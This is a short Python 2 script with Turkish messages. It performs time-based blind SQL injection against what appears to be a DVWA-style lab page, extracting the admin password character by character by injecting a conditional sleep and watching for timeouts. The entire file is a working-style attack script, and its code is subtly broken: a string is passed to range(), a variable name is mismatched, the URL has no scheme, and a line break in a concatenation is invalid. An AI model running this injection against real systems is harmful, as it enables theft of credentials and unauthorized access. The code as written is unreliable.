import requests

characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

target = '10.10.1.133/vulnerabilities/sql_blind/'

username = 'admin'
password_length = '12'
sqlSleepTime = '5'
requestTimeOut = '1'

req = requests.get(target)
if req.status_code != requests.codes.ok:
        raise ValueError('Siteye baglanamadi!...')
else:
        print 'Baglanti kuruldu.'


def letBlind ():
    foundChars = ''
    for i in range(password_length):
        for c in characters:
            try:
                blindSql = '?username=' + username +
                           '" AND IF(password like BINARY "' +
                           foundChars+c+'%",sleep('+sleepTime+'),null)"'
                req = requests.get(target+blindSql,timeout=requestTimeOut)
            except requests.exceptions.Timeout:
                foundChars += c
                print 'Parolada bulunan karakter: ' + foundChars
                break

letBlind()
